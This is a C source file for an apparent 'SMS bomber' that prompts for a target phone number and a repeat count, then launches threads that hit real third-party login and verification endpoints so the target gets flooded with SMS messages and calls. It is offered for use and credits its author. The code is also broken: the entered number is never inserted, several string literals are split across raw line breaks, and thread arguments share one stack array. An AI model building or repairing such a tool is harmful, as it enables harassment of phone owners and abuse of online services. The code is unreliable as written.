#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <curl/curl.h>

void clearScreen() {
    system("cls || clear");
}

void sms(char* url, char* header) {
    sleep(3);
    char jsonData[256];
    sprintf(jsonData, "\"%s\"", header);
    
    CURL *curl;
    CURLcode res;
    struct curl_slist *headers = NULL;
    
    curl = curl_easy_init();
    if(curl) {
        headers = curl_slist_append(headers, "Content-Type: application/json");
        headers = curl_slist_append(headers, jsonData);
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        
        res = curl_easy_perform(curl);
        
        if(res != CURLE_OK) {
            printf("\033[01;31m[-] Error !\n");
        } else {
            printf("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended
");
        }
        
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }
}

void* thread_function(void* args) {
    char** params = (char**)args;
    sms(params[0], params[1]);
    return NULL;
}

int main() {
    clearScreen();
    printf("\033[01;33m
");
    printf("\n\t\t\t\t\t\t\t\t\t\t
");
    printf("    Coded By NICOLA(Telegram: @black_nicola)\n");
    printf("    GitHub: mr-r0ot
");
    printf("\n");
    
    char phone[20];
    printf("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone 09xxxxxxxxxx: \033[00;36m");
    scanf("%s", phone);
    
    int repeatCount;
    printf("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms and call: \033[00;36m");
    scanf("%d", &repeatCount);
    
    char* urls[] = {
        "https://3tex.io/api/1/users/validation/mobile",
        "https://deniizshop.com/api/v1/sessions/login_request",
        // Add all URLs here
    };
    
    char* headers[] = {
        "{\"receptorPhone\": phone}",
        "{\"mobile_phone\": phone}",
        // Add all headers here
    };

    int num_urls = sizeof(urls) / sizeof(urls[0]);
    int num_headers = sizeof(headers) / sizeof(headers[0]);

    pthread_t threads[num_urls * repeatCount];
    int thread_count = 0;

    for (int i = 0; i < repeatCount; i++) {
        for (int j = 0; j < num_urls; j++) {
            char* params[] = {urls[j], headers[j]};
            pthread_create(&threads[thread_count], NULL, thread_function, (void*)params);
            thread_count++;
        }
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}
